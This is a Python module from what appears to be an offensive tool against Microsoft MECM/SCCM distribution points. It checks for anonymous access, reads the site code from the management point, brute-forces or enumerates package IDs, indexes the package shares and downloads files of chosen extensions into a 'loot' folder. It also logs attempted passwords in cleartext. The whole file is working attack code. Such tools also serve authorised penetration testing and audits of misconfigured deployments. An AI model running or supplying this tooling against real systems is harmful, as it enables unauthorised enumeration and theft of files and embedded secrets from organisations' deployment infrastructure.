import os
import json
import string
import random
import urllib
import logging
import requests
import traceback
import xml.etree.ElementTree    as ET

from requests_ntlm              import HttpNtlmAuth
from bs4                        import BeautifulSoup

from conf                       import bcolors, ANONYMOUSDP, DOWNLOADMETHOD, DP_DOWNLOAD_HEADERS, MP_INTERACTIONS_HEADERS

logger = logging.getLogger(__name__)

def checkAnonymousDPConnectionEnabled(distribution_point):
    characters = string.ascii_letters
    random_string = ''.join(random.choice(characters) for i in range(8))

    logger.info(f"[INFO] Checking anonymous DP Connection with URL {distribution_point}/sms_dp_smspkg$/{random_string}")
    r = requests.get(f"{distribution_point}/sms_dp_smspkg$/{random_string}", headers=DP_DOWNLOAD_HEADERS)
    logger.info(f"[INFO] Request returned status code {r.status_code}")
    if r.status_code == 404:
        return ANONYMOUSDP.ENABLED.value
    elif r.status_code == 401:
        return ANONYMOUSDP.DISABLED.value
    else:
        return ANONYMOUSDP.UNKNOWN.value

def checkCredentialsBeforeDownload(distribution_point, username, password):
    sess = requests.Session()
    sess.headers.update(DP_DOWNLOAD_HEADERS)
    sess.auth = HttpNtlmAuth(username, password)
    characters = string.ascii_letters
    random_string = ''.join(random.choice(characters) for i in range(8))

    logger.info(f"[INFO] Checking credentials with URL {distribution_point}/sms_dp_smspkg$/{random_string}")
    r = sess.get(f"{distribution_point}/sms_dp_smspkg$/{random_string}")
    logger.info(f"[INFO] Request returned status code {r.status_code}")
    if r.status_code == 404:
        return True
    else:
        return False


def retrieveSiteCode(management_point):
    logger.info(f"[INFO] Retrieving the MECM site code from management point")
    logger.info(f"[*] Querying MPKEYINFORMATION to extract site code from management point")
    logger.info(f"[INFO] Querying URL {management_point}/SMS_MP/.sms_aut?MPKEYINFORMATION")
    r = requests.get(f"{management_point}/SMS_MP/.sms_aut?MPKEYINFORMATION", headers=MP_INTERACTIONS_HEADERS)
    try:
        root = ET.fromstring(r.text)
    except:
        logger.info(traceback.print_exc())
        logger.info(r.text)
        logger.error(f"{bcolors.FAIL}[-] Failed to parse MECM site code from management point response{bcolors.ENDC}")
        return None

    site_code = root.find("SITECODE")
    if site_code is None:
        logger.error(f"{bcolors.FAIL}[-] Did not find expected SITECODE tag in management point response{bcolors.ENDC}")
        return None
    logger.info(f"{bcolors.OKGREEN}[+] Retrieved site code {site_code.text}{bcolors.ENDC}")
    return site_code.text


def recursivePackageDirectoryFetch(object, directory, authenticated_session=None):
    if authenticated_session is None:
        r = requests.get(directory, headers=DP_DOWNLOAD_HEADERS)
    else:
        r = authenticated_session.get(directory)
    soup = BeautifulSoup(r.content, 'html.parser')
    files = []
    for href in soup.find_all('a'):
        previous_sibling = href.find_previous_sibling(string=True)
        if previous_sibling and 'dir' in previous_sibling:
            object[href.get('href')] = {}
            recursivePackageDirectoryFetch(object[href.get('href')], href.get('href'))
        else:
            files.append(href.get('href'))
    for file in files:
        object[file] = None


def recursiveFileExtract(data, extensions):
    to_download = []
    if isinstance(data, dict):
        for key, value in data.items():
            if value is None and key.endswith(tuple(extensions)):
                to_download.append(key)
            else:
                to_download.extend(recursiveFileExtract(data[key], extensions))
    return to_download




def downloadFiles(target_directory, package, files, session):
    for file in files:
        try:
            parsed_url = urllib.parse.urlparse(file)
            filename = urllib.parse.unquote(parsed_url.path.split('/')[-1])
            r = session.get(file, headers=DP_DOWNLOAD_HEADERS)
            output_file = f"{target_directory}/{filename}"
            with open(output_file, 'wb') as f:
                f.write(r.content)
            logger.warning(f"[INFO] Package {package} - downloaded file {filename}")
        except:
            logger.error(f"{bcolors.FAIL}[!] Error when handling package {file}{bcolors.ENDC}")
            traceback.print_exc()


def downloadTargetFiles(directory_name, extensions, index_file, files, username, password):
    sess = requests.Session()
    sess.headers.update(DP_DOWNLOAD_HEADERS)
    if username is not None and password is not None:
        sess.auth = HttpNtlmAuth(username, password)


    if files is not None:
        with open(files, 'r') as f:
            to_download = f.readlines()
            os.makedirs(f'loot/{directory_name}/packages/files')
            downloadFiles(f'loot/{directory_name}/packages/files', 'N/A', to_download, sess)
    else:
        if index_file is not None:
            with open(index_file, 'r') as f:
                content = json.loads(f.read())
        else:
            with open(f'loot/{directory_name}/packages/index.json', 'r') as f:
                content = json.loads(f.read())
        for key, value in content.items():
            to_download = recursiveFileExtract(value, extensions)
            if len(to_download) == 0:
                continue
            if not os.path.exists(f'loot/{directory_name}/packages/{key}'):
                os.makedirs(f'loot/{directory_name}/packages/{key}')

            downloadFiles(f'loot/{directory_name}/packages/{key}', key, to_download, sess)


def print_tree(d, out, prefix=""):
    keys = list(d.keys())
    for i, key in enumerate(keys):
        is_last = (i == len(keys) - 1)
        if isinstance(d[key], dict):
            out.write(f"{prefix}{'└── ' if is_last else '├── '}{key}/\n")
            new_prefix = f"{prefix}{'    ' if is_last else '│   '}"
            print_tree(d[key], out, new_prefix)
        else:
            out.write(f"{prefix}{'└── ' if is_last else '├── '}{key}\n")



def performBruteforce(distribution_point, package_ids, session):
    results = {}
    for package_id in package_ids:
        try:
            r = session.get(f"{distribution_point}/sms_dp_smspkg$/{package_id}", headers=DP_DOWNLOAD_HEADERS)
            if r.status_code != 200:
                continue
            else:
                logger.warning(f"[*] Found package {package_id}")
                soup = BeautifulSoup(r.content, 'html.parser')
                files = []
                directories = []
                for href in soup.find_all('a'):
                    previous_sibling = href.find_previous_sibling(string=True)
                    if previous_sibling and 'dir' in previous_sibling:
                        directories.append(href.get('href'))
                    else:
                        files.append(href.get('href'))
                
                results[package_id] = {}
                for directory in directories:
                    results[package_id][directory] = {}
                for file in files:
                    results[package_id][file] = None
        except:
            logger.error(f"{bcolors.FAIL}[!] Error when handling potential package {package_id}{bcolors.ENDC}")
            traceback.print_exc()
    return results

            
def bruteforcePackageIDs(distribution_point, site_code, bruteforce_range, directory_name, known_packages, username=None, password=None):
    results = {}
    to_bruteforce = []
    for i in range(bruteforce_range + 1):
        hex_str = hex(i)[2:].upper().zfill(5)
        to_bruteforce.append(site_code + hex_str)

    for package in known_packages:
        if package not in to_bruteforce:
            logger.info(f"[INFO] There is a known package that we missed during bruteforce -> {package}. Adding it to queue")
            to_bruteforce.append(package)
    
    sess = requests.Session()
    sess.headers.update(DP_DOWNLOAD_HEADERS)
    if username is not None and password is not None:
        sess.auth = HttpNtlmAuth(username, password)

    
    try:
        results = performBruteforce(distribution_point, to_bruteforce, sess)
    except:
        traceback.print_exc()
        logger.warning(f"[-] Something went wrong while bruteforcing package IDs - the distribution point may have failed to respond in time ?")

    if username is not None and password is not None:
        directory_fetch_session = sess
    else:
        directory_fetch_session = None
    
    for package in results.keys():
        for item in results[package].keys():
            if isinstance(results[package][item], dict):
                recursivePackageDirectoryFetch(results[package][item], item, directory_fetch_session)
    
    if not os.path.exists(f'loot/{directory_name}/packages'):
        os.makedirs(f'loot/{directory_name}/packages')
    with open(f'loot/{directory_name}/packages/index.json', 'w') as f:
        f.write(json.dumps(results))
    with open(f'loot/{directory_name}/packages/index.txt', 'w') as out:
        print_tree(results, out)

def fetchPackageIDsFromDatalib(distribution_point, directory_name, known_packages, username=None, password=None):
    sess = requests.Session()
    sess.headers.update(DP_DOWNLOAD_HEADERS)
    if username is not None and password is not None:
        sess.auth = HttpNtlmAuth(username, password)
    
    package_ids = set()
    r = sess.get(f"{distribution_point}/sms_dp_smspkg$/datalib", headers=DP_DOWNLOAD_HEADERS)
    soup = BeautifulSoup(r.content, 'html.parser')
    for a in soup.find_all('a'):
        parts = a.get('href').split('/')
        last_part = parts[-1].strip()
        if not last_part.endswith('.INI'):
            package_ids.add(last_part)
    for known_package in known_packages:
        if known_package not in package_ids:
            package_ids.add(known_package)
        
    logger.warning(f"[+] Found {len(package_ids)} packages")
    logger.warning(package_ids)

    results = {}
    for package_id in package_ids:
        r = sess.get(f"{distribution_point}/sms_dp_smspkg$/{package_id}", headers=DP_DOWNLOAD_HEADERS)
        soup = BeautifulSoup(r.content, 'html.parser')
        files = []
        directories = []
        for href in soup.find_all('a'):
            previous_sibling = href.find_previous_sibling(string=True)
            if previous_sibling and 'dir' in previous_sibling:
                directories.append(href.get('href'))
            else:
                files.append(href.get('href'))
        
        results[package_id] = {}
        for directory in directories:
            results[package_id][directory] = {}
        for file in files:
            results[package_id][file] = None
    

    if username is not None and password is not None:
        directory_fetch_session = sess
    else:
        directory_fetch_session = None
    for package in results.keys():
        for item in results[package].keys():
            if isinstance(results[package][item], dict):
                recursivePackageDirectoryFetch(results[package][item], item, directory_fetch_session)
    
    if not os.path.exists(f'loot/{directory_name}/packages'):
        os.makedirs(f'loot/{directory_name}/packages')
    with open(f'loot/{directory_name}/packages/index.json', 'w') as f:
        f.write(json.dumps(results))
    with open(f'loot/{directory_name}/packages/index.txt', 'w') as out:
        print_tree(results, out)



def packageScriptDownload(download_options, directory_name, username, password):
    
    logger.warning(f"{bcolors.OKCYAN}\n[*] Starting file indexing from distribution point using indexing method {bcolors.BOLD}{download_options['method'].value}{bcolors.ENDC}.")
    logger.info(f"[*] Using indexing method {download_options['method'].value}")
    
    if download_options["anonymous"] == ANONYMOUSDP.ENABLED.value:
        logger.warning(f"[*] Anonymous Distribution Point connection is enabled. Dumping without authentication.")

        # In both these cases, we do not need to index again
        if download_options["index_file"] is None and download_options["files"] is None:
            if download_options["method"] == DOWNLOADMETHOD.bruteforce:
                logger.warning(f"[*] Package ID bruteforce (site code {download_options['site_code']}, range {download_options['bruteforce_range']})")
                bruteforcePackageIDs(download_options["distribution_point"], download_options["site_code"], download_options["bruteforce_range"], directory_name, download_options["known_packages"], None, None)
            else:
                fetchPackageIDsFromDatalib(download_options["distribution_point"], directory_name, download_options["known_packages"], None, None)
        
        if download_options["files"] is not None:
            logger.warning(f"{bcolors.OKCYAN}\n[*] Starting unauthenticated file download from URLs in '{download_options['files']}'{bcolors.ENDC}")
        else:
            logger.warning(f"{bcolors.OKCYAN}\n[*] Starting unauthenticated file download with target extensions {download_options['extensions']}{bcolors.ENDC}")
        downloadTargetFiles(directory_name, download_options["extensions"], download_options["index_file"], download_options["files"], None, None)
    else:
        result = checkCredentialsBeforeDownload(download_options["distribution_point"], username, password)
        if result is not True:
            logger.warning(f"{bcolors.FAIL}[-] It seems like provided credentials do not allow to successfully authenticate to distribution point.{bcolors.ENDC}")
            logger.warning(f"{bcolors.FAIL}Potential explanations: wrong credentials ; NTLM disabled on distribution point.{bcolors.ENDC}")
            logger.warning(f"{bcolors.FAIL}Attempted username: '{username}' - attempted password: '{password}{bcolors.ENDC}'")
            return
        
        if download_options["index_file"] is None and download_options["files"] is None:
            if download_options["method"] == DOWNLOADMETHOD.bruteforce:
                logger.warning(f"[*] Package ID bruteforce (site code {download_options['site_code']}, range {download_options['bruteforce_range']})")
                bruteforcePackageIDs(download_options["distribution_point"], download_options["site_code"], download_options["bruteforce_range"], directory_name, download_options["known_packages"], username, password)
            else:
                fetchPackageIDsFromDatalib(download_options["distribution_point"], directory_name, download_options["known_packages"], username, password)
        
        if download_options["files"] is not None:
            logger.warning(f"{bcolors.OKCYAN}\n[*] Starting authenticated file download from URLs in '{download_options['files']}'{bcolors.ENDC}")
        else:
            logger.warning(f"{bcolors.OKCYAN}\n[*] Starting authenticated file download with target extensions {download_options['extensions']}{bcolors.ENDC}")
        downloadTargetFiles(directory_name, download_options["extensions"], download_options["index_file"], download_options["files"], username, password)

